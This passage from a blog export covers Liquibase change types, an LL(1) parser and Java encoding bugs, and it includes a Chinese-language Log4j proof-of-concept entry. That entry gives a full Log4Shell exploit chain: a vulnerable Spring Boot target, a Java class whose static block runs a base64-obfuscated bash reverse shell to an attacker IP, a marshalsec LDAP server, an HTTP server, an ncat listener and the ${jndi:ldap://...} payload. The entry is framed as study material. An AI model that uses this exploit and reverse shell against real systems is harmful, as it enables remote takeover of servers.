                   <span class="attr">tableName</span>=<span class="string">&quot;tra_report_header&quot;</span></span></span><br><span class="line"><span class="tag">                        <span class="attr">uniqueColumns</span>=<span class="string">&quot;id&quot;</span>/&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">17. delete view</span><br><span class="line">oracle:drop view tra_report_header_v;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">dropView</span> <span class="attr">viewName</span>=<span class="string">&quot;tra_report_header&quot;</span> /&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">18. insert data</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">insert</span> <span class="attr">tableName</span>=<span class="string">&quot;tra_report_header&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">column</span> <span class="attr">name</span>=<span class="string">&quot;id&quot;</span> <span class="attr">type</span>=<span class="string">&quot;number&quot;</span> <span class="attr">value</span>=<span class="string">&quot;1&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">insert</span>&gt;</span></span><br><span class="line"></span><br><span class="line">19. modify data type</span><br><span class="line">oracle:alter table tra_report_header modify id int;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">modifyDataType</span> <span class="attr">columnName</span>=<span class="string">&quot;id&quot;</span> <span class="attr">newDataType</span>=<span class="string">&quot;int&quot;</span> <span class="attr">tableName</span>=<span class="string">&quot;tra_report_header&quot;</span>/&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">20. modify column name</span><br><span class="line">alter table tra_report_header rename id to id1;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">renameColumn</span> <span class="attr">columnDataType</span>=<span class="string">&quot;number&quot;</span> <span class="attr">newColumnName</span>=<span class="string">&quot;id1&quot;</span> <span class="attr">oldColumnName</span>=<span class="string">&quot;id&quot;</span> <span class="attr">tableName</span>=<span class="string">&quot;tra_report_header&quot;</span>/&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">21. rename table</span><br><span class="line">oracle:alter table tra_report_header rename tra_report_header1;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">renameTable</span> <span class="attr">newTableName</span>=<span class="string">&quot;tra_report_header1&quot;</span> <span class="attr">oldTableName</span>=<span class="string">&quot;tra_report_header&quot;</span>/&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">22. rename view</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">renameView</span> <span class="attr">newViewName</span>=<span class="string">&quot;tra_report_header_v1&quot;</span> <span class="attr">oldViewName</span>=<span class="string">“tra_report_header_v”/</span>&gt;</span></span><br><span class="line"></span><br><span class="line">23. update data</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">update</span> <span class="attr">tableName</span>=<span class="string">&quot;tra_report_header&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">column</span> <span class="attr">name</span>=<span class="string">&quot;name&quot;</span>  <span class="attr">type</span>=<span class="string">&quot;varchar(100)&quot;</span> <span class="attr">value</span>=<span class="string">&quot;ryan&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">where</span>&gt;</span>id=1<span class="tag">&lt;/<span class="name">where</span>&gt;</span></span><br><span class="line">      </span><br><span class="line">            </span><br></pre></td></tr></table></figure></div>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Database</tag>
      </tags>
  </entry>
  <entry>
    <title>LL(1) Parser</title>
    <url>/2018/05/08/llone/</url>
    <content><![CDATA[<p>LLone github: <a class="link"   href="https://github.com/ReZeroS/LLone" >https://github.com/ReZeroS/LLone<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> A LL parser is a top-down parser for a subset of context-free languages. It parses the input from Left to right, performing Leftmost derivation of the sentence. What do we have to make as input arguments or basic default value?</p>
<ul>
<li>We will input “#i+i*i” to make a example for the test.</li>
<li>The default grammar products are as follows:<ul>
<li>{“E”, “TA”}</li>
<li>{“A”, “+TA”}</li>
<li>{“A”, “$”}</li>
<li>{“T”, “FB”}</li>
<li>{“B”, “*FB”}</li>
<li>{“B”, “$”}</li>
<li>{“F”, “(E)”}</li>
<li>{“F”, “i”}</li>
</ul>
</li>
<li>The Symbol ‘E’ will be as the start symbol</li>
</ul>
]]></content>
      <categories>
        <category>编译原理</category>
      </categories>
      <tags>
        <tag>firstSet</tag>
        <tag>FollowSet</tag>
        <tag>ll1</tag>
        <tag>parser</tag>
        <tag>table</tag>
      </tags>
  </entry>
  <entry>
    <title>Log4j poc</title>
    <url>/2021/12/15/log4jbug/</url>
    <content><![CDATA[<h1 id="本文仅供交流学习使用"><a href="#本文仅供交流学习使用" class="headerlink" title="本文仅供交流学习使用"></a>本文仅供交流学习使用</h1><h2 id="Log4j"><a href="#Log4j" class="headerlink" title="Log4j"></a>Log4j</h2><h3 id="靶机"><a href="#靶机" class="headerlink" title="靶机"></a>靶机</h3><p>log4j 2.4.1, springboot应用</p>
<p>pom 中排除默认的springboot 日志(logback), 引入 log4j</p>
<div class="code-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">project</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span> <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">	<span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">modelVersion</span>&gt;</span>4.0.0<span class="tag">&lt;/<span class="name">modelVersion</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">parent</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-parent<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">version</span>&gt;</span>2.1.3.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">relativePath</span>/&gt;</span> <span class="comment">&lt;!-- lookup parent from repository --&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">parent</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.example<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>log4j2_rce<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">version</span>&gt;</span>0.0.1-SNAPSHOT<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">name</span>&gt;</span>log4j2_rce<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">description</span>&gt;</span>log4j2_rce<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">java.version</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">java.version</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">exclusions</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">exclusion</span>&gt;</span></span><br><span class="line">					<span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">					<span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-logging<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;/<span class="name">exclusion</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;/<span class="name">exclusions</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-test<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">scope</span>&gt;</span>test<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-web<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">version</span>&gt;</span>2.6.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">scope</span>&gt;</span>compile<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">		<span class="comment">&lt;!-- https://mvnrepository.com/artifact/org.apache.logging.log4j/log4j-api --&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.logging.log4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>log4j-api<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">version</span>&gt;</span>2.14.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">		<span class="comment">&lt;!-- https://mvnrepository.com/artifact/org.apache.logging.log4j/log4j-api --&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.logging.log4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>log4j-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">version</span>&gt;</span>2.14.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line"></span><br><span class="line">	<span class="tag">&lt;<span class="name">build</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">plugins</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-maven-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">plugins</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">build</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">project</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>模拟靶机环境，调用 <code>log.error</code></p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@SpringBootApplication</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo1Application</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">Logger</span> <span class="variable">logger</span> <span class="operator">=</span> LogManager.getLogger(Demo1Application.class);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        SpringApplication.run(Demo1Application.class, args);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping(&#123;&quot;/s&quot;&#125;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">hello</span><span class="params">(<span class="meta">@RequestParam(&quot;payload&quot;)</span> String payload)</span> &#123;</span><br><span class="line">        System.setProperty(<span class="string">&quot;com.sun.jndi.ldap.object.trustURLCodebase&quot;</span>, <span class="string">&quot;true&quot;</span>);</span><br><span class="line">        System.setProperty(<span class="string">&quot;com.sun.jndi.rmi.object.trustURLCodebase&quot;</span>, <span class="string">&quot;true&quot;</span>);</span><br><span class="line">        logger.error(<span class="string">&quot;&#123;&#125;&quot;</span>, payload);</span><br><span class="line">        logger.info(<span class="string">&quot;&#123;&#125;&quot;</span>, payload);</span><br><span class="line">        logger.info(payload);</span><br><span class="line">        logger.error(payload);</span><br><span class="line">        <span class="keyword">return</span> payload;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>直接启动靶机即可</p>
<h3 id="攻击机"><a href="#攻击机" class="headerlink" title="攻击机"></a>攻击机</h3><p>首先编译一个类，类中通过 <code>static</code> 块反弹shell，可以通过 b64编码绕过部分安全防护<br><code>bash -i  &gt;&amp; /dev/tcp/192.168.137.156/7777  0&gt;&amp;1</code>  &#x3D;b64&gt; <code>YmFzaCAtaSAgPiYgL2Rldi90Y3AvMTkyLjE2OC4xMzcuMTU2Lzc3NzcgIDA+JjE=</code></p>
<p>反弹shell命令</p>
<div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">目标是在靶机上执行该命令</span></span><br><span class="line">bash -i  &gt;&amp; /dev/tcp/Attacker_IP/7777  0&gt;&amp;1</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">b64 编码</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash">bash -c &#123;<span class="built_in">echo</span>,YmFzaCAtaSAgPiYgL2Rldi90Y3AvMTkyLjE2OC4xMzcuMTU2Lzc3NzcgIDA+JjE=&#125;|&#123;<span class="built_in">base64</span>,-d&#125;|&#123;bash,-i&#125;</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">攻击机监听端口</span></span><br><span class="line">ncat -lvvp 7777</span><br></pre></td></tr></table></figure></div>

<p><code>javac</code> 后拿到 <code>Inject.class</code></p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// javac Inject.java</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Inject</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Inject</span><span class="params">()</span>&#123;&#125;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            String[] cmd = &#123;<span class="string">&quot;/bin/bash&quot;</span>, <span class="string">&quot;-c&quot;</span>, <span class="string">&quot;&#123;echo,YmFzaCAtaSAgPiYgL2Rldi90Y3AvMTkyLjE2OC4xMzcuMTU2Lzc3NzcgIDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span>&#125;;</span><br><span class="line">            Runtime.getRuntime().exec(cmd);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>随便架一个资源服务，能暴露 <code>Inject.class</code> 即可，简单的方式就是对应目录下 <code>python3 -m http.server port</code></p>
<p>最后我们在攻击机上搭建 <code>ldap</code> 服务，然后为上面这个资源服务做一个中转即可，目的是为了提供<code>ldap</code>协议支持</p>
<p>启动 ldap, <a class="link"   href="https://github.com/mbechler/marshalsec" >仓库地址<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a><br><code>java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer &quot;资源服务器路径/#Inject&quot;</code></p>
<h3 id="过程梳理"><a href="#过程梳理" class="headerlink" title="过程梳理"></a>过程梳理</h3><p>目前又一个资源服务器，只提供下载 <code>Inject.class</code> 的功能，<code>Inject</code> 类中<code>static</code>块加载时会触发 <a class="link"   href="https://www.jackson-t.ca/runtime-exec-payloads.html" >GetShell<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p>靶机明显就是通过 <code>log.error</code> 漏洞加载这个 <code>Inject.class</code>，最终会被我们攻击机的 <code>ncat</code> 拿到反弹的 <code>shell</code>。</p>
<p>所以我们向靶机发起 <code>payload</code>: <code>GET http://localhost:8001/s?payload=$&#123;jndi:ldap://服务ldap路径/Inject&#125;</code><br>触发它去加载远程的 <strong><code>ldap</code> 服务</strong>所 <em><strong>转发</strong></em> 的 <strong>资源服务</strong> 的 <code>Inject.class</code> 从而直接触发 <code>static</code> 的 <code>getShell</code>,<br>同时我们提前开启监听的<code>ncat</code> 就会捕获这个 <code>shell</code></p>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>POC</tag>
        <tag>WebSecurity</tag>
      </tags>
  </entry>
  <entry>
    <title>Messy code issue</title>
    <url>/2018/01/23/messy-code/</url>
    <content><![CDATA[<p>Source: <a class="link"   href="https://www.ibm.com/developerworks/cn/java/analysis-and-summary-of-common-random-code-problems/index.html?cm_mmc=dwchina-_-homepage-_-social-_-weibo#N101F9" >https://www.ibm.com/developerworks/cn/java/analysis-and-summary-of-common-random-code-problems/index.html?cm_mmc=dwchina-_-homepage-_-social-_-weibo#N101F9<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<h3 id="Reason"><a href="#Reason" class="headerlink" title="Reason"></a>Reason</h3><ol>
<li><p>Encode</p>
</li>
<li><p><em>Decode</em></p>
</li>
<li><p>Lack of a font library</p>
</li>
</ol>
<h3 id="Analysis-phenomenon"><a href="#Analysis-phenomenon" class="headerlink" title="Analysis phenomenon"></a>Analysis phenomenon</h3><ol>
<li>Caused by encoding</li>
</ol>
<p>In English Windows, u create a txt, type and save “你好”. Then u will see “??” after u open it.</p>
<ul>
<li><p>Reason:<br> Windows uses ANSI encode by default, and locale of Ewin is English, which mapping codepage 437 as the encode way is ISO-8859-1. This cause all chinese symbols will be mapping “3F3F” as encode result. And 3F reach “?”.</p>
</li>
<li><p>Solution:<br> No decode way could display that right characters. So we should choose the right encode way when we save double byte character doc such as GB2312 or UTF-8 as simple chinese while BIG5 or UTF-8 in complex chinese. For chinese user, changing the locale to Chinese also a good idea.</p>
</li>
</ul>
<ol start="2">
<li>Caused by decoding</li>
</ol>
<p>Create a txt with “你好”, and copy it to Ewin. Then open it and get the error.</p>
<ul>
<li><p>Reason:<br> Cwin create txt used ANSI as GB2312, and after copy it to Ewin, notepad will use ISO-8859-1 as decode way.</p>
</li>
<li><p>Solution:<br> Select the right decode method.</p>
</li>
</ul>
<ol start="3">
<li>Caused by application function.</li>
</ol>
<p>Open the uedit32.exe(cn version) and get the messy code.</p>
<ul>
<li><p>Reason: Windows will use Unicode if the application support Unicode or use the ANSI(Which means as the country decided standard encode method)</p>
</li>
<li><p>Solution: Edit the Regional and language options: set the <code>standard and format</code> and <code>non-Unicode</code> as simple chinese. Then the system will decode use ANSI.</p>
</li>
</ul>
<ol start="4">
<li>Caused by lack of font</li>
</ol>
<p> Open file and get square symbol.</p>
<ul>
<li><p>Reason: From binary byte sequence to code point, then to character which is found from font library. Then show as lattice on the screen. If not fonud, then use square to replace it.</p>
</li>
<li><p>Solution: Setup the library.</p>
</li>
</ul>
<h3 id="Think-in-coding"><a href="#Think-in-coding" class="headerlink" title="Think in coding"></a>Think in coding</h3><ol>
<li><p>I&#x2F;O operation: read is decode(byte-&gt;character) while write is encode(character-&gt;byte)</p>
</li>
<li><p>Here is the java I&#x2F;O interface:</p>
</li>
</ol>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2018/01/23/messy-code/image010.png"
                      class="" title="java i&#x2F;o interface"
                >

<p>When we use Writer and FileOutputStream:</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2018/01/23/messy-code/image011.jpg"
                      class="" title="File I&#x2F;O Stream"
                >

<ol start="3">
<li>String.getBytes.</li>
</ol>
<p>String.getBytes(): Encodes this String into a sequence of bytes using the platform’s default charset(Charset.defaultCharset(), which is decided by system attribute file.encoding), storing the result into a new byte array.</p>
<p>Note: if use do not set the jvm’s file.encoding, it will depend on the environment which start the JVM: If cmd, then use regional language while eclipse could set this attribute.</p>
<p>List[1]. String.getBytes() display messy code</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">public static void main(String[] args) &#123;</span><br><span class="line">    private static final String fileName = &quot;c:\\log.txt&quot; ;</span><br><span class="line">    String str =&quot;你好，中国&quot;;</span><br><span class="line">    writeError(str);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">private static void writeError(String a_error) &#123;</span><br><span class="line">    try &#123;</span><br><span class="line">        File logFile = new File(fileName);</span><br><span class="line">        //创建字节流对象</span><br><span class="line">        FileOutputStream outPutStream = new FileOutputStream(logFile, true);</span><br><span class="line">        //使用平台的默认字符集将此字符串编码为一系列字节</span><br><span class="line">        outPutStream.write(a_error.getBytes(), 0, a_error.length() );</span><br><span class="line">        outPutStream.flush();</span><br><span class="line">    &#125; catch (IOException e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>List[2].outputStreamWrite to set character library</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">private static void writeErrorWithCharSet(String a_error) &#123;</span><br><span class="line">    try &#123; </span><br><span class="line">        File logFile = new File(FileName);</span><br><span class="line">        String charsetName = &quot;utf-8&quot;;</span><br><span class="line">        //指定字符字节转换时使用的字符集为 Unicode，编码方式为 utf-8 </span><br><span class="line">        Writer m_write = new BufferedWriter(</span><br><span class="line">        new OutputStreamWriter(new java.io.FileOutputStream(logFile, true),</span><br><span class="line">        charsetName) );</span><br><span class="line">        m_write.write(a_error);</span><br><span class="line">        m_write.close();</span><br><span class="line">    &#125; catch (IOException e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><em>To avoid messy code issue, when call the I&#x2F;O api, u had better to use the overload format with pointing library args.</em></p>
<h3 id="Web-Application"><a href="#Web-Application" class="headerlink" title="Web Application"></a>Web Application</h3><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2018/01/23/messy-code/image012.jpg"
                      class="" title="Web messy code"
                >

<p>Reason: </p>
<ol>
<li><p>Browser not followed the URI encode standard. Server not config the encode and decode. Devloper’s error.</p>
</li>
<li><p>GET method: encode the non-ASCII character by <a class="link"   href="https://www.w3schools.com/tags/ref_urlencode.asp" >urlencode<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>.</p>
</li>
</ol>
<p><code>域名:端口/contextPath/servletPath/pathInfo?queryString</code> PathInfo and queryString will depend on the server. Tomcat always set them on the server.xml, pathInfo part decode character library is defined on the connector’s <Connector URIEncoding="UTF-8" />, and queryString was by useBodyEncodingForURI(if not set, tomcat will use UTF-8:version &gt;&#x3D; 8.0)  </p>
<p>To avoid the encode which we do not want, we had better use ASCII only(or urlencode first) on the url. </p>
<ol start="3">
<li>Post method: Browser will check the contentType(“text&#x2F;html;charset&#x3D;utf-8”) then encode form by using it.</li>
</ol>
<p><code>&lt;%@ page language=&quot;java&quot; contentType=&quot;text/html; charset=&quot;GB18030&quot; pageEncoding=&quot;UTF-8&quot;%&gt;</code> pageEncoding is how to save the jsp file.</p>
<p>list[3] POST request set setContentType</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">protected void doPost(HttpServletRequest request, HttpServletResponse</span><br><span class="line">response) throws ServletException, IOException &#123;</span><br><span class="line">    if(!ServletFileUpload.isMultipartContent(request))&#123;</span><br><span class="line">        throw new ServletException(&quot;Content type is not multipart/form-data&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    response.setCharacterEncoding(&quot;UTF-8&quot;);//设置响应编码 </span><br><span class="line">    response.setContentType(&quot;text/html;charset=UTF-8&quot;);</span><br><span class="line">    PrintWriter out = response.getWriter();</span><br><span class="line">    out.write(&quot;&lt;html&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;&quot;);</span><br><span class="line">    try &#123; </span><br><span class="line">        List&lt;FileItem&gt; items = (List&lt;FileItem&gt;)</span><br><span class="line">        uploader.parseRequest(request);</span><br><span class="line">        …</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>JSP, use post method to do request</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;%@ page language=&quot;java&quot; contentType=&quot;text/html; charset=utf-8&quot; pageEncoding=&quot;utf-8&quot;%&gt;</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE HTML PUBLIC &quot;-//W3C//DTD HTML 4.01 Transitional//EN&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line"></span><br><span class="line">&lt;head&gt;</span><br><span class="line"></span><br><span class="line">&lt;title&gt;index&lt;/title&gt;</span><br><span class="line"></span><br><span class="line">&lt;meta http-equiv=&quot;pragma&quot; content=&quot;no-cache&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;meta http-equiv=&quot;cache-control&quot; content=&quot;no-cache&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;meta http-equiv=&quot;expires&quot; content=&quot;0&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;form action=&quot;FileUploadServlet&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;</span><br><span class="line"></span><br><span class="line">选择上传文件：&lt;input type=&quot;file&quot; name=&quot;fileName&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;br&gt;</span><br><span class="line"></span><br><span class="line">&lt;input type=&quot;submit&quot; value=&quot;上传&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;/form&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line"></span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></div>

<pre><code>- Browser display: Chrome use jsp contentType and charset while firefox use text encoding.

- For jsp(html): jsp will saved as pageEncoding, if not ponit it, then use charset, if not charset, then as default ISO-8859-1. Charset reponse for notify the browser how to decode web page.

- For dynamic: Server use HttpServletResponse.setContentType to set http header&#39;s contentType.
</code></pre>
<h3 id="File-name-be-messy-code-when-downloading"><a href="#File-name-be-messy-code-when-downloading" class="headerlink" title="File name be messy code when downloading"></a>File name be messy code when downloading</h3><p>Reason: Header only support ASCII library, and encode other character to 3F(<code>?</code>)</p>
<p>Solution: urlEncode.encode(filename, charset) at first, then put it on the header.</p>
<p>list[4]</p>
